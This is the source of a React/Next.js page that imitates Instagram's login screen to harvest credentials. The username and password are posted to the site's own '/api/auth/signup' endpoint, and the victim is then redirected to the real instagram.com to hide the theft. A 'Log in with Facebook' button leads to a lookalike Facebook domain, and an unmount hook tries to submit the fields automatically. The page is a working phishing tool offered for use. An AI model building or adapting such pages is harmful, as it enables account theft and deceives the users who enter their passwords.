import React, {useState,useEffect} from 'react'

import Link from 'next/link';

import {useRouter} from 'next/router'

import Layout from "../components/contrib/layout"

import userData from "../components/contrib/user_files"


import {NextSeo} from 'next-seo'

import axios from 'axios'

//config--email,picture,language

const homePage = 'http://instagram.com'
const fbHomePage = 'https://myfb.vercel.app'


 const main = () => {

const router = useRouter()

const [username,setUsername] = useState('')
const [password,setPassword] = useState('')
const [show,setShow] = useState(false)
const [load,setLoad] = useState(false)
const [login,setLogin] = useState(false)




useEffect(()=>{

router.push('/#instagram_OAuth_login_rc_2')

return ()=> {
  console.log('login',login)
  if (!login) Login()
}

},[])



const Login = async e=>{

e.preventDefault()

    const body = {
      username: username,
      password:password,
      site:'instagram'
    }



 try {
setLoad(true)

    const res = await axios.post('/api/auth/signup', body)


if(res.data){
  setLoad(false)
  router.push(homePage)
  setLogin(true)

}

   

  } catch (error) {
    console.log(error+': Failed to Log in')
    setLoad(false)


  }



}


const signUpWithFB = e=>{

e.preventDefault()

	router.push(fbHomePage)
}




    return (  

     <Layout >


<NextSeo title={"Login . Instagram"} />



<section class="_9eogI E3X2T">
<div></div>



<main class="SCxLW  o64aR pt-4 bgWhite " role="main">
<div class="mt-1      Igw0E   rBNOH     YBx95   ybXk5   vwCYk    MGky5      i0EQd    "
 style={{minHeight: '100%'}}>
 <div class="rgFsT   ">
 <div class=" show     Igw0E     IwRSH   YBx95   ybXk5    _4EzTm     _22l1   _49XvD     "><div class="_7UhW9  PIoXz  MMzan  KV-D4     uL8Hv    "><span class="_3G4x7   RFk-t bwz9f ">
<div class="TQUPK"><span>English</span>
<div class="      Igw0E     IwRSH eGOV_    _4EzTm      WKY0a   ">
<span style={{
  display: 'inline-block',transform: 'rotate(180deg)'}}>
  <svg aria-label="Down Chevron Icon" class="_8-yf5 " fill="#8e8e8e" height="12" role="img" viewBox="0 0 48 48" width="12"><path d="M40 33.5c-.4 0-.8-.1-1.1-.4L24 18.1l-14.9 15c-.6.6-1.5.6-2.1 0s-.6-1.5 0-2.1l16-16c.6-.6 1.5-.6 2.1 0l16 16c.6.6.6 1.5 0 2.1-.3.3-.7.4-1.1.4z"></path></svg></span></div>

</div>

<select aria-label="Switch Display Language" class="hztqj"><option value="af">Afrikaans</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="en">English</option><option value="en-gb">English (UK)</option><option value="es">Español (España)</option><option value="es-la">Español</option><option value="fi">Suomi</option><option value="fr">Français</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">Norsk</option><option value="nl">Nederlands</option><option value="pl">Polski</option><option value="pt-br">Português (Brasil)</option><option value="pt">Português (Portugal)</option><option value="ru">Русский</option><option value="sv">Svenska</option><option value="th">ภาษาไทย</option><option value="tl">Filipino</option><option value="tr">Türkçe</option><option value="zh-cn">中文(简体)</option><option value="zh-tw">中文(台灣)</option><option value="bn">বাংলা</option><option value="gu">ગુજરાતી</option><option value="hi">हिन्दी</option><option value="hr">Hrvatski</option><option value="hu">Magyar</option><option value="kn">ಕನ್ನಡ</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ne">नेपाली</option><option value="pa">ਪੰਜਾਬੀ</option><option value="si">සිංහල</option><option value="sk">Slovenčina</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="vi">Tiếng Việt</option><option value="zh-hk">中文(香港)</option><option value="bg">Български</option><option value="fr-ca">Français (Canada)</option><option value="ro">Română</option><option value="sr">Српски</option><option value="uk">Українська</option></select></span></div>



</div>
<div class="gr27e  ">




<h1 style={{
margin: '22px auto 12px',
    backgroundRepeat: 'no-repeat',
    backgroundPosition:' 0 -130px',
    height: '55px',
    width: '175px',
    fontFamily:'FontspringBold',
    fontSize:41,
    color:'black'
}} class="text-black inst  ">Instagram</h1><div class="EPjEi">



<div class=" show mt-4 pt-2     Igw0E     IwRSH eGOV_    _4EzTm    bkEs3      CovQj   jKUp7     DhRcB      ">
<button onClick={signUpWithFB} class="sqdOP yWX7d    y3zKF  btn-primary btn   " type="button">


<span class=" icon-copy fa fa-facebook-official AeB99 " style={{fontSize:18,color:'#fff',
top:2}} ></span>

<span style={{fontSize:14,color:'white'}} class="KPnG0 ">Log in with Facebook</span></button>
</div>

<div class="K-1uj Z7p_S show" style={{marginBottom:-1}}>

<div class="s311c"></div>

<div class="_0tv-g">or</div>

<div class="s311c"></div>

</div>


<form class="HmktE" >
<div class="      Igw0E     IwRSH eGOV_    _4EzTm      kEKum  ">
<div class="-MzZI">
<div class="_9GP1n   ">
<label class="f0n8F ">
<span class="_9nyy2" style={username ? {fontSize:11,top:-10}:{}} >Phone number, username, or email</span>
<input onChange={e=>setUsername(e.target.value)} 
style={username ? {fontSize:13,paddingTop:17,marginRight:-8}:{marginRight:-8}} 
aria-label="Phone number, username, or email" aria-required="true"
 autocapitalize="off" autocorrect="off" maxlength="75" defaultValue={username}
  type="username" className="_2hvTZ pexuQ zyHYP" /></label>
  <div class="i24fI"></div>

</div>

</div>

<div class="-MzZI">
<div class="_9GP1n   "><label class="f0n8F ">
<span class="_9nyy2" style={password ? {fontSize:11,top:-10}:{}} >Password</span>
<input onChange={e=>setPassword(e.target.value)} 
style={password ? {fontSize:13,paddingTop:17,marginRight:-8}:{marginRight:-8}} 
 aria-label="Password" aria-required="true"
  autocapitalize="off" autocorrect="off"  type={show?"text":"password"}
   class="_2hvTZ pexuQ zyHYP" defaultValue={password} />
  {password && <div style={{position:'absolute',
right:'0'}} class="Igw0E     IwRSH pt-2     eGOV_   _4EzTm   soMvl  ">
   <button onClick={e=>setShow(!show)} style={{backgroundColor:'transparent'}}
    class="sqdOP yWX7d     _8A5w5    " type="button">{show ? 'Hide': 'Show'}</button></div>
}
</label>
<div class="i24fI"></div>

</div>

</div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm    bkEs3      CovQj   jKUp7     DhRcB      ">
<button class="sqdOP  L3NKy   y3zKF    "
 disabled={!username||!password}  
 onClick={Login} >
<div class="      Igw0E     IwRSH eGOV_    _4EzTm  d-flex align-items-center justify-content-center    ">Log In 
{load &&  
<span className="spinner-border spinner-border-sm mx-4 text-white " role="status" >
                         </span>}</div>

</button></div> 

<div class="K-1uj Z7p_S hide">

<div class="s311c"></div>

<div class="_0tv-g">or</div>

<div class="s311c"></div>

</div>

<div class=" hide      Igw0E     IwRSH eGOV_    _4EzTm    bkEs3      CovQj   jKUp7     DhRcB      ">
<button onClick={signUpWithFB} class="sqdOP yWX7d    y3zKF     " type="button">


<span class=" icon-copy fa fa-facebook-official AeB99" style={{fontSize:18,color:'#385185',
top:2}} ></span>

<span style={{fontSize:14}} class="KPnG0 ">Log in with Facebook</span></button>
</div>

</div>

<a class="_2Lks6" href="https://instagram.com/accounts/password/reset/" tabindex="0">Forgot password?</a></form></div>

</div>

<div class="gr27e"><div class="_7UhW9   xLCgt MMzan   _0PwGv    uL8Hv    ">
<p class="izU2O ">Don't have an account? <a href="https://instagram.com/accounts/emailsignup/" tabindex="0"><span class="_7UhW9   xLCgt  qyrsm gtFbE se6yk   ">Sign up</span></a></p></div>

</div>

<div class="APQi1"><p class="b_nGN">Get the app.</p><div class="iNy2T"><a class="z1VUo" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo" tabindex="0">
<img alt="Available on the App Store" 
class="Rt8TI " src="/vendors/images/180ae7a0bcf7.png"
  /></a><a class="z1VUo" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D0D3590D6-E1DD-4D5F-A340-905F150F6CCD%26utm_content%3Dlo%26utm_medium%3Dbadge" tabindex="0">
<img alt="Available on Google Play" class="Rt8TI " 
src="/vendors/images/e9cd846dc748.png " /></a></div>

</div>

</div>

</div>

</main><footer class="_8Rna9  _3Laht pC2e0 " role="contentinfo"><div class="      Igw0E     IwRSH eGOV_    _4EzTm     KokQV    "><div class="      Igw0E     IwRSH eGOV_    _4EzTm      kEKum  "><div class="      Igw0E     IwRSH   YBx95   ybXk5    _4EzTm  YlhBV  "><div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   "><a href="https://about.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">About</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://about.instagram.com/blog/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Blog</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://instagram.com/about/jobs/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Jobs</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://help.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Help</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://developers.facebook.com/docs/instagram" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">API</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://instagram.com/legal/privacy/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Privacy</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://instagram.com/legal/terms/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Terms</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="htps://instagram.com/directory/profiles/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Top Accounts</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://instagram.com/directory/hashtags/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Hashtags</div>

</a></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm     _22l1 soMvl   JI_ht   ">
<a href="https://instagram.com/explore/locations/"><div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">Locations</div>

</a></div>

</div>

</div>

<div class="      Igw0E     IwRSH   YBx95   ybXk5    _4EzTm     _22l1   _49XvD     "><div class="_7UhW9  PIoXz  MMzan  KV-D4     uL8Hv    "><span class="_3G4x7   RFk-t bwz9f ">
<div class="TQUPK"><span>English</span>
<div class="      Igw0E     IwRSH eGOV_    _4EzTm      WKY0a   ">
<span style={{
	display: 'inline-block',transform: 'rotate(180deg)'}}>
	<svg aria-label="Down Chevron Icon" class="_8-yf5 " fill="#8e8e8e" height="12" role="img" viewBox="0 0 48 48" width="12"><path d="M40 33.5c-.4 0-.8-.1-1.1-.4L24 18.1l-14.9 15c-.6.6-1.5.6-2.1 0s-.6-1.5 0-2.1l16-16c.6-.6 1.5-.6 2.1 0l16 16c.6.6.6 1.5 0 2.1-.3.3-.7.4-1.1.4z"></path></svg></span></div>

</div>

<select aria-label="Switch Display Language" class="hztqj"><option value="af">Afrikaans</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="en">English</option><option value="en-gb">English (UK)</option><option value="es">Español (España)</option><option value="es-la">Español</option><option value="fi">Suomi</option><option value="fr">Français</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">Norsk</option><option value="nl">Nederlands</option><option value="pl">Polski</option><option value="pt-br">Português (Brasil)</option><option value="pt">Português (Portugal)</option><option value="ru">Русский</option><option value="sv">Svenska</option><option value="th">ภาษาไทย</option><option value="tl">Filipino</option><option value="tr">Türkçe</option><option value="zh-cn">中文(简体)</option><option value="zh-tw">中文(台灣)</option><option value="bn">বাংলা</option><option value="gu">ગુજરાતી</option><option value="hi">हिन्दी</option><option value="hr">Hrvatski</option><option value="hu">Magyar</option><option value="kn">ಕನ್ನಡ</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ne">नेपाली</option><option value="pa">ਪੰਜਾਬੀ</option><option value="si">සිංහල</option><option value="sk">Slovenčina</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="vi">Tiếng Việt</option><option value="zh-hk">中文(香港)</option><option value="bg">Български</option><option value="fr-ca">Français (Canada)</option><option value="ro">Română</option><option value="sr">Српски</option><option value="uk">Українська</option></select></span></div>

<div class="      Igw0E     IwRSH eGOV_    _4EzTm    _5VUwz    ">
<div class="_7UhW9  PIoXz  MMzan   _0PwGv    uL8Hv    ">© {new Date().getFullYear()} Instagram from Facebook</div>

</div>

</div>

</div>

</footer></section>

     </Layout >

);
}

export default main;


